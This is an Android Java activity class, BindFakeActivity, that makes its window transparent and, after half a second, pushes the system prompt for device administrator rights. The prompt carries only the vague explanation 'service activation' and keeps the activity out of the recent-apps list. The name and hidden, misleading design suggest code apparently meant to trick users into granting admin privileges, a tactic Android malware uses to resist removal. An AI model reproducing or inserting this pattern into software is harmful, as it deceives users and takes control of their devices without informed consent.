package com.xstd.qm.activity;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.os.Handler;
import com.umeng.analytics.MobclickAgent;
import com.xstd.qm.receiver.BindDeviceReceiver;

/**
 * Created by michael on 13-12-23.
 */
public class BindFakeActivity extends Activity {

    private Handler mHandler = new Handler();

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        this.getWindow().setBackgroundDrawable(new ColorDrawable(0x00000000));

        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(getApplicationContext(), BindDeviceReceiver.class));
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "服务激活");
                i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                startActivityForResult(i, 1000);
            }
        }, 500);
    }

    @Override
    public void onStart() {
        super.onStart();
        MobclickAgent.onResume(getApplicationContext());
    }

    @Override
    public void onStop() {
        super.onStop();
        MobclickAgent.onPause(getApplicationContext());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == 1000) {
            finish();
        }
    }
}